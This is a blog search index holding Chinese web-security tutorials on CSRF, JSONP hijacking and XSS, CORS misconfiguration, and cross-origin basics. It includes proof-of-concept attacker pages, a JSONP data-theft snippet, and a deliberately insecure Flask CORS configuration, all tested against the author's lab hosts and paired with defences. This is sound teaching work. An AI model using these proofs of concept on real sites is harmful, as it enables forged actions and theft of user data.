<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CSRF</title>
      <link href="/2022/10/19/csrf/"/>
      <url>/2022/10/19/csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF（Cross-site request forgery）跨站请求伪造。攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>业务站点 A、恶意站点 B</p><ul><li>受害者登录 A，并保留了 A 的 cookie</li><li>攻击者通过钓鱼等手段诱使受害者访问 B</li><li>B 向 A 发起一个请求，此时游览器会默认携带 A 站点的 Cookie</li><li>A 站点收到请求后，认为是受害者自己发送的请求，执行正常的业务逻辑</li><li>攻击完成，攻击者在受害者不知情的情况下冒充受害者请求 A 站点</li></ul><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="GET-型"><a href="#GET-型" class="headerlink" title="GET 型"></a>GET 型</h3><p>业务站点 A<code>http://silk-dream.outlaws.com/</code> 、恶意站点 B<code>http://192.168.1.4:2333</code></p><p>模拟情况为业务站点 A 有一个接口<code>/vus/csrf/attack</code> ，恶意站点 B 也可以访问到该接口即为攻击成功</p><p>保存下方内容为<code>index.html</code> ，并使用 python 在 2333 启动 web 服务</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">      history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://silk-dream.outlaws.com/api/vuls/csrf/attack<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>attack<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -m http.server <span class="token number">2333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020000218408.png"></p><p>观察 burp，向模拟接口发起了请求，并且携带了 cookie</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020000311710.png"></p><h3 id="POST-型"><a href="#POST-型" class="headerlink" title="POST 型"></a>POST 型</h3><p><code>index.html</code>变更为下边的内容</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">      history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>      <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://silk-dream.outlaws.com/api/vuls/csrf/attack<span class="token punctuation">"</span></span>      <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span>    <span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>attack<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020003930512.png" alt="image-20221020003930512"></p><h2 id="CSRF-的特点"><a href="#CSRF-的特点" class="headerlink" title="CSRF 的特点"></a>CSRF 的特点</h2><ul><li><p>CSRF(通常)发生在第三方站点</p></li><li><p>利用 CSRF 的攻击者并不能获取到用户的 Cookie，只是借用</p></li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>通过 CSRF 的特点我们可以针对性的进行防护</p><h3 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h3><p>由于 CSRF(通常)发生在第三方站点，那么我们可以直接禁止外域（或者不受信任的域名）对我们发起请求。</p><p>在游览器发起请求时通常会带有 Referer 请求头，并且不能由前端自定义，服务端可以通过判断 Referer 头来确定是否同源。</p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>前面讲到 CSRF 的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用 Cookie 中的信息。而 CSRF 攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个 CSRF 攻击者无法获取到的 Token。服务器通过校验请求是否携带正确的 Token，来把正常的请求和攻击的请求区分开，也可以防范 CSRF 的攻击。</p><p>在用户请求 html 时，服务端生成 CSRF Token，并将其嵌入在表单 hidden 中，在提交表单时就会自动带入</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>”hidden”<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>”csrftoken”<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>”tokenvalue”<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过在当前 restful 盛行的情况下，该选项并不使用，还有一种简单的就是前端在利用 axios、ajax 等发起请求时，在 header 和 cookie 中同时放入 CSRF Token，也可以起到相似的作用。</p><h3 id="Samesite-Cookie-属性"><a href="#Samesite-Cookie-属性" class="headerlink" title="Samesite Cookie 属性"></a>Samesite Cookie 属性</h3><p>防止 CSRF 攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google 起草了一份草案来改进 HTTP 协议，那就是为 Set-Cookie 响应头新增 Samesite 属性，它用来标明这个 Cookie 是个“同站 Cookie”，同站 Cookie 只能作为第一方 Cookie，不能作为第三方 Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax。</p><h4 id="Strict"><a href="#Strict" class="headerlink" title="Strict"></a>Strict</h4><p>严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。例如我们修改我们的 Access-Token 的 Samesite 为 Strict</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020001836283.png"></p><p>此时再按照复现中的步骤进行就会发现再向模拟请求发起请求时不会携带 Cookie，从而被拦截</p><p>GET</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020002317302.png"></p><p>POST</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020001940107.png"></p><h4 id="Lax"><a href="#Lax" class="headerlink" title="Lax"></a>Lax</h4><p>这种称为宽松模式，比 Strict 放宽了点限制</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020002400434.png"></p><p>GET</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020002407183.png"></p><p>POST</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221020003435433.png"></p><p>也就是说 Lax 只对 POST 有效，对 GET 无效</p><h3 id="RESTful-JSON"><a href="#RESTful-JSON" class="headerlink" title="RESTful+JSON"></a>RESTful+JSON</h3><p>RESTful 并不是一种 CSRF 的解决方案，而是一种编码风格。其规定 C/S 通信时常用 GET、POST、PUT、DELETE 四种 HTTP 请求动词。</p><p>GET 常用来获取资源；POST 用来新建资源；PUT 用来更新资源；DELETE 用来删除资源。</p><p>其中 POST、PUT、DELETE 请求时<code>Content-Type</code>为<code>application/json</code> ，我们知道像 CSRF、JSONP 劫持都是没有办法发起 JSON 请求的，而 GET 仅仅用来获取资源的话，CSRF 攻击也就无法成功了。JSON 请求只能使用 XMLHTTPRequest 发起，但该请求方式受到 CORS 配置的影响，不属于 CSRF 的范畴。</p><p><strong>推荐的防御措施是：使用 RESTful+JSON 编码风格并且设置 Cookie 的 Samesite 属性</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.runoob.com/w3cnote/restful-architecture.html">https://www.runoob.com/w3cnote/restful-architecture.html</a></p><p><a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">https://tech.meituan.com/2018/10/11/fe-security-csrf.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 常规web漏洞 </tag>
            
            <tag> 前端安全 </tag>
            
            <tag> 钓鱼 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsonp的安全问题</title>
      <link href="/2022/10/18/jsonp-de-an-quan-wen-ti/"/>
      <url>/2022/10/18/jsonp-de-an-quan-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="JSONP-的安全问题"><a href="#JSONP-的安全问题" class="headerlink" title="JSONP 的安全问题"></a>JSONP 的安全问题</h1><p>之前的文章讲了<a href="https://outlaws-bai.github.io/2022/10/17/qian-duan-kua-yu-wen-ti/">前端跨域问题</a>以及几种常见的解决方案。本文详细讲述其中 JSONP 所遇到的安全问题。</p><p>JSONP 作为一种被 jQuery 封装的跨域方案，使用还是非常广泛的，其常会遇到 JSONP 劫持、XSS 攻击。</p><h2 id="JSONP-劫持"><a href="#JSONP-劫持" class="headerlink" title="JSONP 劫持"></a>JSONP 劫持</h2><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>业务站点 A <code>http://192.168.1.4:5000</code> 攻击站点 B <code>http://192.168.1.4:2333</code></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"># index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">function</span> <span class="token function">userInfo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>username<span class="token punctuation">)</span>  <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.1.4:5000/vuls/jsonp/getUserInfo?callback=userInfo<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存为<code>index.html</code> 后，启动 python web 服务</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">2333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017235002661.png"></p><p>使用游览器访问<code>http://192.168.1.4:2333/</code> ，可以看到已经获跨域成功并获取到了信息</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017235109628.png"></p><p>此时观察 burp，有两条流量，一条获取 html 源码，一条向 B 站点发起跨域请求。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017235210844.png"></p><p>这里以弹窗进行展示，实际过程中攻击站点 B 在获取到敏感信息后可以发送到站点 B 的后台</p><p>具体攻击流程如下图</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018235541788.png"></p><p>jQuery 下可以使用下边的 html</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  $<span class="token punctuation">.</span><span class="token function">getJSON</span><span class="token punctuation">(</span>    <span class="token string">'http://192.168.1.4:5000/vuls/jsonp/getUserInfo?callback=?'</span><span class="token punctuation">,</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>username<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>敏感信息泄露，如邮箱、手机号、姓名等。</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>验证 JSONP 的调用来源（Referer），服务端判断 Referer 是否是白名单，或者部署随机 Token 来防御</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>我们注意到<a href="http://192.168.1.4:5000/vuls/jsonp/getUserInfo?callback=userInfo">http://192.168.1.4:5000/vuls/jsonp/getUserInfo?callback=userInfo</a> 这个接口，访问回显如下</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018233219832.png"></p><p>如果我们修改 callback 的值，发现页面内容会随之更改</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018233253547.png"></p><p>此时就可以插入 XSS payload</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018233337205.png"></p><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>这里是因为 callback 的值可控并且会回显到页面上，可以通过修改 content-type 来修复，不建议对 payload 进行过滤，容易被绕过。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018233719505.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018233838193.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018233846582.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018234955080.png"></p><h1 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h1><p>真实场景中</p><ul><li>通过请求参数，callback 的参数名可能会发生变化，常见的有<code>callback</code>、<code>cb</code>、<code>json</code> 、<code>jsonp</code>、<code>jsonpcallback</code>等</li><li>通过响应格式，jsonp 的响应格式为 xxx({})</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/21.JSONP%E6%95%B0%E6%8D%AE%E5%8A%AB%E6%8C%81/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/21.JSONP%E6%95%B0%E6%8D%AE%E5%8A%AB%E6%8C%81/</a></p><p><a href="http://drops.xmd5.com/static/drops/papers-6630.html">http://drops.xmd5.com/static/drops/papers-6630.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/62694920">https://zhuanlan.zhihu.com/p/62694920</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JSONP </tag>
            
            <tag> 跨域 </tag>
            
            <tag> XSS </tag>
            
            <tag> JSONP劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CORS配置不当</title>
      <link href="/2022/10/17/cors-pei-zhi-bu-dang/"/>
      <url>/2022/10/17/cors-pei-zhi-bu-dang/</url>
      
        <content type="html"><![CDATA[<h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>上文介绍了<a href="https://outlaws-bai.github.io/2022/10/17/qian-duan-kua-yu-wen-ti/">前端跨域问题</a>以及三种跨域方案的基本实现。</p><h2 id="CORS-配置不当"><a href="#CORS-配置不当" class="headerlink" title="CORS 配置不当"></a>CORS 配置不当</h2><p>已知使用 CORS 跨域需要在 B 站点做一些配置以允许 A 站点可以跨域访问 B 站点。</p><p>那如果配置存在问题，例如 B 站点允许其他所有站点都可以跨域对其访问，这个时候就会出现安全问题。</p><h3 id="CORS-跨域配置的常见位置"><a href="#CORS-跨域配置的常见位置" class="headerlink" title="CORS 跨域配置的常见位置"></a>CORS 跨域配置的常见位置</h3><p><code>nginx</code> 和<code>服务后端</code></p><h3 id="测试方式"><a href="#测试方式" class="headerlink" title="测试方式"></a>测试方式</h3><p>向待测试的站点 B 发起 OPTIONS 请求，并设置 Origin 头为任意站点，如<code>http://outlaws.com</code> 。</p><p>当发现响应头中的<code>Access-Control-Allow-Origin</code> 等于请求头中的<code>Origin</code> 头且响应头中的<code>Access-Control-Allow-Credentials</code> 为<code>true</code> 时，CORS 配置就是不安全的。其实严格意义<code>Access-Control-Allow-Origin</code>等于<code>*</code> 也存在问题，不过这种很难利用，因为当没有<code>Access-Control-Allow-Credentials</code>响应头的话，跨域是无法携带cookie的，而如果<code>Access-Control-Allow-Credentials</code>等于<code>true</code>，此时又会被游览器默认配置拦截，见下方<code>验证</code> 章节。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018000942936.png"></p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>攻击者可以诱导用户访问伪造好的站点 C，C 被打开后会自动跨域请求 B 站点，拿到敏感信息后再发送到 C 站点的后端，即完成了攻击。</p><p>还是上文那个例子，只是 A 站点换为了恶意站点 C</p><p>存在漏洞站点 B <code>http://192.168.1.4:5000/</code> , 恶意站点 C <code>http://192.168.1.4:8000</code></p><p>打开恶意站点 C 点击 init cookies 后再点击获取敏感信息，可以看到已经获得了敏感信息。这里只是为了测试，在攻击情况下，完全可以在用户打开恶意站点 C 时直接向站点 B 发起跨域请求。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018001551795.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017233657395.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017233708163.png"></p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>Access-Control-Allow-Origin等于*且Access-Control-Allow-Credentials等于true</p><p>此时默认配置下游览器会自动拦截这种行为，因为游览器认为这是一种非常不安全的配置。</p><p>设置请求时 withCredentials 为 true，测试一下，发现出现了报错。观察 burp 只有一条 OPTIONS 请求，并没有发起真正的跨域请求 POST</p><pre class="line-numbers language-none"><code class="language-none">Access to XMLHttpRequest at 'http://192.168.1.4:5000/vuls/cors/getUserInfo' from origin 'http://192.168.1.4:8000' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018002854549.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221018002833083.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 常规web漏洞 </tag>
            
            <tag> CORS </tag>
            
            <tag> 前端安全 </tag>
            
            <tag> CORS配置不当 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端跨域问题</title>
      <link href="/2022/10/17/qian-duan-kua-yu-wen-ti/"/>
      <url>/2022/10/17/qian-duan-kua-yu-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h1><p>想要了解前端安全安全，跨域是一个绕不过的话题。</p><h2 id="出现原因"><a href="#出现原因" class="headerlink" title="出现原因"></a>出现原因</h2><p>同源策略（Same Orgin Policy）是一种约定，它是浏览器核心也最基本的安全功能，它会阻止一个域的 js 脚本和另外一个域的内容进行交互，如果缺少了同源策略，浏览器很容易受到 XSS、CSFR 等攻击。</p><h2 id="同源"><a href="#同源" class="headerlink" title="同源"></a>同源</h2><p>先看一下 URL 的完整格式</p><pre class="line-numbers language-none"><code class="language-none">scheme://username:password@host:port/path/query#fragment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017231332368.png"></p><p>游览器认为两个站点 scheme、host、port 中任意一个不相同即为不同源</p><h2 id="跨域的解决方案"><a href="#跨域的解决方案" class="headerlink" title="跨域的解决方案"></a>跨域的解决方案</h2><h3 id="1-代理"><a href="#1-代理" class="headerlink" title="1.代理"></a>1.代理</h3><p>nginx 以及其他 web 后端/node 框架都会提供代理功能，这也是最安全的方案。</p><h3 id="2-CORS"><a href="#2-CORS" class="headerlink" title="2.CORS"></a>2.CORS</h3><p>允许浏览器向不同源站点发起 XMLHttpRequest 请求，但需要服务端做 CORS 相关配置。</p><p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>A 站点<code>http://192.168.1.4:8000/</code> B 站点 <code>http://192.168.1.4:5000/</code></p><p>a.我们在 flask 配置跨域支持</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">CORS<span class="token punctuation">(</span>app<span class="token punctuation">,</span> resources<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">r"/*"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"origins"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> supports_credentials<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 其实这里就存在安全问题</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>b.在前端发起 XMLHttpRequest 时设置<code>withCredentials</code> 为<code>true</code></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017233613596.png"></p><p>c.点击 init cookies 后再点击获取敏感信息，可以看到已经获得了敏感信息</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017233549702.png"></p><p>d.此时观察 burp，发现会有两条 http 请求</p><p>首先游览器会发起 OPTIONS 方法请求需要跨域访问接口，得到服务端在响应头中的允许之后才会发起 POST 请求，并且因为在第一条请求中设置了 Access-Control-Allow-Credentials 为 true，因此第二条请求还会携带 Cookie</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017233657395.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221017233708163.png"></p><h3 id="3-JSONP"><a href="#3-JSONP" class="headerlink" title="3.JSONP"></a>3.JSONP</h3><p>利用可以允许跨域的 html 标签。如<code>img</code> <code>script</code> 等</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>A 站点<code>http://192.168.1.4:2333/</code> B 站点 <code>http://192.168.1.4:5000/</code></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"># index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">function</span> <span class="token function">userInfo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>username<span class="token punctuation">)</span>  <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.1.4:5000/vuls/jsonp/getUserInfo?callback=userInfo<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存为<code>index.html</code> 后，启动 python web 服务</p><pre 